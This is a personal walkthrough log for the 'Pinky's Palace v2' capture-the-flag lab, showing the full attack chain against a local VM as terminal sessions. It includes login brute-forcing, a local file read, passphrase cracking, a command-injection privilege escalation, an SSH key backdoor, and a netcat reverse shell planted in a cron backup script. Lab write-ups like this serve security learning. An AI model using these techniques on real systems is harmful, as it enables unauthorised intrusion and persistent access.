Pinky Palace-2
https://drive.google.com/open?id=1yd89dDzVeHUlLK-Vd2NN-2icepcmEUlJ

root@kali:~/Desktop# arp-scan -I eth0 10.1.1.0/24
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.9 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.1.1.128	00:0c:29:5e:07:a1	VMware, Inc.
10.1.1.254	00:50:56:f4:77:dc	VMware, Inc.

root@kali:~/Desktop# bash ./detailPortScan.sh 10.1.1.254 -> all port close tcp/udp

#target has wordpress port 80
root@kali:~/Desktop# bash ./detailPortScan.sh 10.1.1.128
working on 10.1.1.128...
will be a while so relax ^^
------------------------------------------------------------------------------------------------------------------------------------------------------unicornscan 10.1.1.128:1-65535
TCP: 80
------------------------------------------------------------------------------------------------------------------------------------------------------nmap 10.1.1.128 -A -p 80

Starting Nmap 7.60 ( https://nmap.org ) at 2018-04-22 15:30 EDT
Nmap scan report for 10.1.1.128
Host is up (0.00028s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-generator: WordPress 4.9.4
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Pinky&#039;s Blog &#8211; Just another WordPress site
MAC Address: 00:0C:29:5E:07:A1 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
…


root@kali:~/Desktop# nikto -host http://10.1.1.128
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.1.1.128
+ Target Hostname:    10.1.1.128
+ Target Port:        80
+ Start Time:         2018-04-22 15:34:03 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.25 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'link' found, with contents: <http://pinkydb/index.php?rest_route=/>; rel="https://api.w.org/"
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-3268: /secret/: Directory indexing found.
+ OSVDB-3092: /secret/: This might be interesting...
+ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80 
+ OSVDB-3233: /icons/README: Apache default file found.
+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login.php: Wordpress login found
+ 7518 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2018-04-22 15:34:20 (GMT-4) (17 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


      *********************************************************************
      Portions of the server's headers (Apache/2.4.25) are not in
      the Nikto database or are newer than the known string. Would you like
      to submit this information (*no server specific data*) to CIRT.net
      for a Nikto update (or you may email to sullo@cirt.net) (y/n)? n

#interesting
http://pinkydb/index.php?rest_route=/>; rel="https://api.w.org/"
/secret/
/icons/README
/wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version
/wp-links-opml.php: This WordPress script reveals the installed version.
/license.txt:
/wp-login.php:


#add ip/hostname to /etc/hosts
10.1.1.128	pinkydb

#server has display error enable
root@kali:~/Desktop# curl http://pinkydb/index.php?rest_route=%27 | html2text 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   113  100   113    0     0    113      0  0:00:01 --:--:--  0:00:01 10272
{"code":"rest_no_route","message":"No route was found matching the URL and
request method","data":{"status":404}}

#port knock sequence? -> probably not b/c repeated scan on both IP returns no additional ports
root@kali:~/Desktop# curl http://pinkydb/secret/bambam.txt
8890
7000
666

pinkydb

#vulnerable plugin?
root@kali:~/Desktop# curl http://pinkydb/wp-content/plugins/akismet/readme.txt

#OPML V 1
http://pinkydb/wp-links-opml.php

#wordpress license
http://pinkydb/license.txt

#wp login
http://pinkydb/wp-login.php

root@kali:~/Desktop# gobuster -u http://pinkydb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e -x php,txt,html

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://pinkydb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes : 204,301,302,307,200
[+] Extensions   : .php,.txt,.html
[+] Expanded     : true
=====================================================
http://pinkydb/index.php (Status: 301) -> view html -> <meta name="generator" content="WordPress 4.9.4" />
http://pinkydb/wp-content (Status: 301) -> blank
http://pinkydb/wp-login.php (Status: 200)
http://pinkydb/wordpress (Status: 301) -> http://pinkydb/wordpress/wp-admin/setup-config.php
http://pinkydb/license.txt (Status: 200)
http://pinkydb/wp-includes (Status: 301) -> dir listing enable!!
http://pinkydb/readme.html (Status: 200)
http://pinkydb/wp-trackback.php (Status: 200) —> XML error
http://pinkydb/secret (Status: 301) -> http://pinkydb/secret/bambam.txt
http://pinkydb/wp-admin (Status: 301) -> login
http://pinkydb/wp-signup.php (Status: 302) -> login
=====================================================

root@kali:~/Desktop# whatweb http://pinkydb
http://pinkydb [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.1.1.128], JQuery[1.12.4], MetaGenerator[WordPress 4.9.4], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[Pinky&#039;s Blog &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[4.9.4]

#wordpress
wpscan --update
root@kali:~/Desktop# wpscan -u http://pinkydb -e ap,at,tt,u
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.9.3
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://pinkydb/
[+] Started: Sun Apr 22 16:58:18 2018

[!] The WordPress 'http://pinkydb/readme.html' file exists exposing a version number
[+] Interesting header: LINK: <http://pinkydb/index.php?rest_route=/>; rel="https://api.w.org/"
[+] Interesting header: SERVER: Apache/2.4.25 (Debian)
[+] XML-RPC Interface available under: http://pinkydb/xmlrpc.php
[!] Includes directory has directory listing enabled: http://pinkydb/wp-includes/

[+] WordPress version 4.9.4 (Released on 2018-02-06) identified from meta generator, links opml
[!] 4 vulnerabilities identified from the version number

[!] Title: WordPress <= 4.9.4 - Application Denial of Service (DoS) (unpatched)
    Reference: https://wpvulndb.com/vulnerabilities/9021
    Reference: https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html
    Reference: https://github.com/quitten/doser.py
    Reference: https://thehackernews.com/2018/02/wordpress-dos-exploit.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389

[!] Title: WordPress 3.7-4.9.4 - Remove localhost Default
    Reference: https://wpvulndb.com/vulnerabilities/9053
    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101
[i] Fixed in: 4.9.5

[!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login
    Reference: https://wpvulndb.com/vulnerabilities/9054
    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100
[i] Fixed in: 4.9.5

[!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag
    Reference: https://wpvulndb.com/vulnerabilities/9055
    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102
[i] Fixed in: 4.9.5

[+] WordPress theme in use: twentyseventeen - v1.4

[+] Name: twentyseventeen - v1.4
 |  Last updated: 2018-04-03T00:00:00.000Z
 |  Location: http://pinkydb/wp-content/themes/twentyseventeen/
 |  Readme: http://pinkydb/wp-content/themes/twentyseventeen/README.txt
[!] The version is out of date, the latest version is 1.5
 |  Style URL: http://pinkydb/wp-content/themes/twentyseventeen/style.css
 |  Theme Name: Twenty Seventeen
 |  Theme URI: https://wordpress.org/themes/twentyseventeen/
 |  Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a...
 |  Author: the WordPress team
 |  Author URI: https://wordpress.org/

[+] Enumerating plugins from passive detection ...
[+] No plugins found

[+] Enumerating all plugins (may take a while and use a lot of system resources) ...

   Time: 00:00:48 <=======================================================================================> (73944 / 73944) 100.00% Time: 00:00:48

[+] We found 1 plugins:

[+] Name: akismet - v4.0.2
 |  Last updated: 2018-02-19T15:25:00.000Z
 |  Location: http://pinkydb/wp-content/plugins/akismet/
 |  Readme: http://pinkydb/wp-content/plugins/akismet/readme.txt
[!] The version is out of date, the latest version is 4.0.3

[+] Enumerating all themes (may take a while and use a lot of system resources) ...

   Time: 00:00:11 <=======================================================================================> (16522 / 16522) 100.00% Time: 00:00:11

[+] We found 1 themes:

[+] Name: twentyseventeen - v1.4
 |  Last updated: 2018-04-03T00:00:00.000Z
 |  Location: http://pinkydb/wp-content/themes/twentyseventeen/
 |  Readme: http://pinkydb/wp-content/themes/twentyseventeen/README.txt
[!] The version is out of date, the latest version is 1.5
 |  Style URL: http://pinkydb/wp-content/themes/twentyseventeen/style.css
 |  Theme Name: Twenty Seventeen
 |  Theme URI: https://wordpress.org/themes/twentyseventeen/
 |  Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a...
 |  Author: the WordPress team
 |  Author URI: https://wordpress.org/

[+] Enumerating timthumb files ...

   Time: 00:00:01 <=========================================================================================> (2541 / 2541) 100.00% Time: 00:00:01

[+] No timthumb files found

[+] Enumerating usernames ...
[+] Identified the following 1 user/s:
    +----+-----------+---------------------+
    | Id | Login     | Name                |
    +----+-----------+---------------------+
    | 1  | pinky1337 | pinky1337 – Pinky's |
    +----+-----------+---------------------+

[+] Finished: Sun Apr 22 16:59:46 2018
[+] Requests Done: 93393
[+] Memory used: 186.48 MB
[+] Elapsed time: 00:01:28

#dic attack
hydra -l pinky1337 -P ./pinky.pass 10.1.1.128 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fpinkydb%2Fwp-admin%2F&testcookie=1:ERROR" -V

#using
root@kali:~/Desktop# cat pinky.pass 
pinky8890
pinky7000
pinky666
pinkydb8890
pinkydb7000
pinkydb666

#PORT KNOCKING!!!!!!!!!!!!!
#nothing works, and no vuln.  a little peek on a walk through, it apewars there is port knocking enable
and 8890 7000 666 are the keys to solve port knock!!
https://d7x.promiselabs.net/2018/04/10/ctf-pinkys-palace-v2-hard-vulnhub-ctf-walkthrough/

#sequence to unlock port from my test
root@kali:~/Desktop# a=8890;b=7000;c=666;arr=($b $c $a);for p in ${arr[@]};do nc -vnz 10.1.1.128 $p;done
(UNKNOWN) [10.1.1.128] 7000 (afs3-fileserver) : Connection refused
(UNKNOWN) [10.1.1.128] 666 (?) : Connection refused
(UNKNOWN) [10.1.1.128] 8890 (?) : Connection refused
root@kali:~/Desktop# nmap 10.1.1.128 -p-

Starting Nmap 7.60 ( https://nmap.org ) at 2018-04-22 20:54 EDT
Nmap scan report for pinkydb (10.1.1.128)
Host is up (0.00020s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
80/tcp    open  http
4655/tcp  open  unknown
7654/tcp  open  unknown
31337/tcp open  Elite
MAC Address: 00:0C:29:5E:07:A1 (VMware)

root@kali:~/Desktop# nmap -A 10.1.1.128 -p 4655,7654,31337

Starting Nmap 7.60 ( https://nmap.org ) at 2018-04-22 20:56 EDT
Nmap scan report for pinkydb (10.1.1.128)
Host is up (0.00029s latency).

PORT      STATE SERVICE VERSION
4655/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey: 
|   2048 ac:e6:41:77:60:1f:e8:7c:02:13:ae:a1:33:09:94:b7 (RSA)
|   256 3a:48:63:f9:d2:07:ea:43:78:7d:e1:93:eb:f1:d2:3a (ECDSA)
|_  256 b1:10:03:dc:bb:f3:0d:9b:3a:e3:e4:61:03:c8:03:c7 (EdDSA)
7654/tcp  open  http    nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: Pinkys Database
31337/tcp open  Elite?
| fingerprint-strings: 
|   DNSStatusRequest, DNSVersionBindReq, GenericLines, NULL, RPCCheck: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|   GetRequest: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     HTTP/1.0
|   HTTPOptions: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     OPTIONS / HTTP/1.0
|   Help: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     HELP
|   RTSPRequest: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     OPTIONS / RTSP/1.0
|   SIPOptions: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     OPTIONS sip:nm SIP/2.0
|     Via: SIP/2.0/TCP nm;branch=foo
|     From: <sip:nm@nm>;tag=root
|     <sip:nm2@nm2>
|     Call-ID: 50000
|     CSeq: 42 OPTIONS
|     Max-Forwards: 70
|     Content-Length: 0
|     Contact: <sip:nm@nm>
|_    Accept: application/sdp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.60%I=7%D=4/22%Time=5ADD2F5C%P=x86_64-pc-linux-gnu%r(N
SF:ULL,59,"\[\+\]\x20Welcome\x20to\x20The\x20Daemon\x20\[\+\]\n\0This\x20i
SF:s\x20soon\x20to\x20be\x20our\x20backdoor\n\0into\x20Pinky's\x20Palace\.
SF:\n=>\x20\0")%r(GetRequest,6B,"\[\+\]\x20Welcome\x20to\x20The\x20Daemon\
SF:x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20our\x20backdoor\n\0into\
SF:x20Pinky's\x20Palace\.\n=>\x20\0GET\x20/\x20HTTP/1\.0\r\n\r\n")%r(SIPOp
SF:tions,138,"\[\+\]\x20Welcome\x20to\x20The\x20Daemon\x20\[\+\]\n\0This\x
SF:20is\x20soon\x20to\x20be\x20our\x20backdoor\n\0into\x20Pinky's\x20Palac
SF:e\.\n=>\x20\0OPTIONS\x20sip:nm\x20SIP/2\.0\r\nVia:\x20SIP/2\.0/TCP\x20n
SF:m;branch=foo\r\nFrom:\x20<sip:nm@nm>;tag=root\r\nTo:\x20<sip:nm2@nm2>\r
SF:\nCall-ID:\x2050000\r\nCSeq:\x2042\x20OPTIONS\r\nMax-Forwards:\x2070\r\
SF:nContent-Length:\x200\r\nContact:\x20<sip:nm@nm>\r\nAccept:\x20applicat
SF:ion/sdp\r\n\r\n")%r(GenericLines,5D,"\[\+\]\x20Welcome\x20to\x20The\x20
SF:Daemon\x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20our\x20backdoor\n
SF:\0into\x20Pinky's\x20Palace\.\n=>\x20\0\r\n\r\n")%r(HTTPOptions,6F,"\[\
SF:+\]\x20Welcome\x20to\x20The\x20Daemon\x20\[\+\]\n\0This\x20is\x20soon\x
SF:20to\x20be\x20our\x20backdoor\n\0into\x20Pinky's\x20Palace\.\n=>\x20\0O
SF:PTIONS\x20/\x20HTTP/1\.0\r\n\r\n")%r(RTSPRequest,6F,"\[\+\]\x20Welcome\
SF:x20to\x20The\x20Daemon\x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20o
SF:ur\x20backdoor\n\0into\x20Pinky's\x20Palace\.\n=>\x20\0OPTIONS\x20/\x20
SF:RTSP/1\.0\r\n\r\n")%r(RPCCheck,5A,"\[\+\]\x20Welcome\x20to\x20The\x20Da
SF:emon\x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20our\x20backdoor\n\0
SF:into\x20Pinky's\x20Palace\.\n=>\x20\0\x80")%r(DNSVersionBindReq,59,"\[\
SF:+\]\x20Welcome\x20to\x20The\x20Daemon\x20\[\+\]\n\0This\x20is\x20soon\x
SF:20to\x20be\x20our\x20backdoor\n\0into\x20Pinky's\x20Palace\.\n=>\x20\0"
SF:)%r(DNSStatusRequest,59,"\[\+\]\x20Welcome\x20to\x20The\x20Daemon\x20\[
SF:\+\]\n\0This\x20is\x20soon\x20to\x20be\x20our\x20backdoor\n\0into\x20Pi
SF:nky's\x20Palace\.\n=>\x20\0")%r(Help,5F,"\[\+\]\x20Welcome\x20to\x20The
SF:\x20Daemon\x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20our\x20backdo
SF:or\n\0into\x20Pinky's\x20Palace\.\n=>\x20\0HELP\r\n");
MAC Address: 00:0C:29:5E:07:A1 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.29 ms pinkydb (10.1.1.128)



root@kali:~/Desktop# nikto -h http://pinkydb:7654/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.1.1.128
+ Target Hostname:    pinkydb
+ Target Port:        7654
+ Start Time:         2018-04-23 23:15:53 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.10.3
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /config.php: PHP Config file may contain database IDs and passwords.
+ /login.php: Admin login page/section found.
+ 7375 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2018-04-23 23:16:02 (GMT-4) (9 seconds)
---------------------------------------------------------------------------

#got nothing
http://pinkydb:7654/config.php

#seems to be a dummy page??
http://pinkydb:7654/login.php

root@kali:~/Desktop# gobuster -u http://pinkydb:7654 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e -x php,txt,html

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://pinkydb:7654/
[+] Threads      : 10
[+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
[+] Extensions   : .php,.txt,.html
[+] Expanded     : true
=====================================================
http://pinkydb:7654/index.php (Status: 200)
http://pinkydb:7654/login.php (Status: 200)
http://pinkydb:7654/config.php (Status: 200)
=====================================================

#interesting, from browser
http://pinkydb:31337/

[+] Welcome to The Daemon [+]
�This is soon to be our backdoor
�into Pinky's Palace.
=> �GET / HTTP/1.1
Host: pinkydb:31337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0***********
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

root@kali:~/Desktop# curl http://pinkydb:31337/ --output -
[+] Welcome to The Daemon [+]
This is soon to be our backdoor
into Pinky's Palace.
=> GET / HTTP/1.1
Host: pinkydb:31337
User-Agent: curl/7.57.0***********
Accept: */*

#so it seems the app just repeats what ever we send it 
#after fooling around it seems, a buffer of 992 - 1090 produces weird characters at the end
root@kali:~/Desktop# perl -e 'print"A"x991' | nc -vn 10.1.1.128 31337
root@kali:~/Desktop# perl -e 'print"A"x992’ | nc -vn 10.1.1.128 31337
root@kali:~/Desktop# perl -e 'print"A"x1090' | nc -vn 10.1.1.128 31337


cewl http://pinkydb -w ./pinky.cewel
root@kali:~/Desktop# hydra -l pinky -P ./pinky.cewel pinkydb -s 7654 http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid Username"
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-04-24 01:06:20
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 167 login tries (l:1/p:167), ~11 tries per task
[DATA] attacking http-post-form://pinkydb:7654//login.php:user=^USER^&pass=^PASS^:Invalid Username
[7654][http-post-form] host: pinkydb   login: pinky   password: Passione
1 of 1 target successfully completed, 1 valid password found


http://pinkydb:7654/credentialsdir1425364865/notes.txt
- Stefano
- Intern Web developer
- Created RSA key for security for him to login

root@kali:~/Desktop# curl http://pinkydb:7654/pageegap.php?1337=/etc/passwd
root:x:0:0:root:/root:/bin/bash
…
pinky:x:1000:1000:pinky,,,:/home/pinky:/bin/bash
mysql:x:106:111:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
demon:x:1001:1001::/home/demon:/bin/bash
stefano:x:1002:1002::/home/stefano:/bin/bash
…

#creack id_rsa passphrase
root@kali:~/Desktop# ssh2john ./id_rsa > id_rsa.john

root@kali:~/Desktop# john --wordlist=/usr/share/wordlists/rockyou.txt ./id_rsa.john 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
secretz101       (id_rsa)


root@kali:~/Desktop# ssh -i id_rsa stefano@10.1.1.128 -p 4655
Enter passphrase for key 'id_rsa': 
Linux Pinkys-Palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Mar 17 21:18:01 2018 from 172.19.19.2
stefano@Pinkys-Palace:~$ id
uid=1002(stefano) gid=1002(stefano) groups=1002(stefano)


stefano@Pinkys-Palace:~$ cat /var/www/html/apache/wp-config.php
…
/ ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'pwp_db');

/** MySQL database username */
define('DB_USER', 'pinkywp');

/** MySQL database password */
define('DB_PASSWORD', 'pinkydbpass_wp');

/** MySQL hostname */
define('DB_HOST', 'localhost');

…

reverse engineer /home/stefano/tools/qsub and found password
xterm-256color
further analysisshows the program append the argument to /home/pinky/messages/stefano_msg.txt
using system().

system(“/bin/echo ttt >> /home/pinky/messages/stefano_msg.txt”)
so
system(“/bin/echo ;/bin/bash;echo >> /home/pinky/messages/stefano_msg.txt”)

will get me escalation to pinky with

stefano@Pinkys-Palace:~/tools$ ./qsub ";/bin/bash;echo"
[+] Input Password: xterm-256color

pinky@Pinkys-Palace:~/tools$ id		********got pinky
uid=1000(pinky) gid=1002(stefano) groups=1002(stefano)
pinky@Pinkys-Palace:~/tools$ whoami
pinky

backdoor pinky with SSH key
pinky@Pinkys-Palace:/home/pinky$ mkdir .ssh
pinky@Pinkys-Palace:/home/pinky$ nano ~/.ssh/authorized_keys
pinky@Pinkys-Palace:/home/pinky$ nano .ssh/authorized_keys
pinky@Pinkys-Palace:/home/pinky$ cat .ssh/authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDZMXOoJHbs9tIPHgc0saimP2xiLmuwZYzmk1vZjNQQu2pTvlUl1zI2UKneZZrkwWIiD3+sQ/1qBkK39QbP+8I6UBivVwJXb8ebFXqIHSvF1L5A2SQAQXuBdtXTPx5oC77SZ7BU+bc7FsdxSqDK1fBWJKx3t1FYYQSIz0XyJavhmrXxwamDL6Vcm0S+AIfIjAd8KfD7tU9dE+qlYxyB6NKnhOK3A+8rhcyJuYToibw0fmM6SrXsQIyVTnsNoGnCwXxo5xPHb9z/xjJ5WgJylygdWAgFnPOsLEe5cgxKHCDV8v/1EjTrbezZR1C/MtL46KUB84l3a5af+ySLxpWvYptf root@kali
 

root@kali:/usr/share/exploitdb# ssh pinky@10.1.1.128 -p 4655
Linux Pinkys-Palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
pinky@Pinkys-Palace:~$ 

pinky@Pinkys-Palace:~/messages$ history 
    1  ls -al
    2  cd
    3  ls -al
    4  cd /usr/local/bin
    5  ls -al
    6  vim backup.sh 
    7  su demon

pinky@Pinkys-Palace:~/messages$ ls -l /usr/local/bin/backup.sh 
-rwxrwx--- 1 demon pinky 149 Apr 22 14:43 /usr/local/bin/backup.sh
pinky@Pinkys-Palace:~/messages$ cat /usr/local/bin/backup.sh 
#!/bin/bash

rm /home/demon/backups/backup.tar.gz
tar cvzf /home/demon/backups/backup.tar.gz /var/www/html
#
#
#
pinky@Pinkys-Palace:~/messages$


edit the file to
pinky@Pinkys-Palace:~/messages$ cat /usr/local/bin/backup.sh 
#!/bin/bash

rm /home/demon/backups/backup.tar.gz
tar cvzf /home/demon/backups/backup.tar.gz /var/www/html
nc -vn 10.1.1.129 4444 -e /bin/bash
#
#
#
pinky@Pinkys-Palace:~/messages$


root@kali:~/Desktop# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.1.1.129] from (UNKNOWN) [10.1.1.128] 49946
id
uid=1001(demon) gid=1001(demon) groups=1001(demon)
pwd
/home/demon

#add root pub key to authrized keyfile
root@kali:~/Desktop# ssh demon@10.1.1.128 -p 4655
Linux Pinkys-Palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
demon@Pinkys-Palace:~$ pwd
/home/demon

demon@Pinkys-Palace:~$ find / -user demon -ls 2>/dev/null | grep -v proc
        8      0 crw--w----   1 demon    tty      136,   5 Apr 22 14:51 /dev/pts/5
        7      0 crw--w----   1 demon    tty      136,   4 Apr 22 14:49 /dev/pts/4
   786433      4 drwxr-x---   2 demon    demon        4096 Mar 17 19:48 /daemon
   917510     16 -rwxr-x---   1 demon    demon       13280 Mar 17 19:48 /daemon/panel
  4587530      4 drwxr-x---   5 demon    demon        4096 Apr 22 14:47 /home/demon
  4587548      4 drwxr-xr-x   2 demon    demon        4096 Apr 22 14:50 /home/demon/backups
….

demon@Pinkys-Palace:~$ ls -l /daemon/panel
-rwxr-x--- 1 demon demon 13280 Mar 17 19:48 /daemon/panel
demon@Pinkys-Palace:~$ file /daemon/panel
/daemon/panel: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2d568c8bce502884642e6a62b93033441b616e46, not stripped
demon@Pinkys-Palace:~$ ps -elf | grep panel
4 S root        522      1  0  80   0 -  1010 -      02:16 ?        00:00:00 /daemon/panel
1 S root      30540    522  0  80   0 -  1010 -      14:10 ?        00:00:00 /daemon/panel
0 S demon     30957  30917  0  80   0 -  3196 -      14:52 pts/5    00:00:00 grep panel

#so panel is running as root, exploit?
#copy it over and start exploit dev

#run elf
root@kali:~/Desktop# netstat -antp4
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      701/sshd            
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      520/postgres        
tcp        0      0 0.0.0.0:31337           0.0.0.0:*               LISTEN      2208/./panel        
tcp        0      0 10.1.1.129:36074        10.1.1.128:4655         ESTABLISHED 1685/ssh            
tcp        0      0 10.1.1.129:36068        10.1.1.128:4655         ESTABLISHED 1469/ssh            
root@kali:~/Desktop# perl -e 'print"A"x112 . "B"x8 . "C"x8' | nc -vn 10.1.1.129 31337


#and debug with edb
root@kali:~/Desktop# edb --attach 2208

found that rip is overwritten at 128 bytes, and begin of buffer is just after ert.
root@kali:~/Desktop# ropper -f panel --search jmp
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: jmp

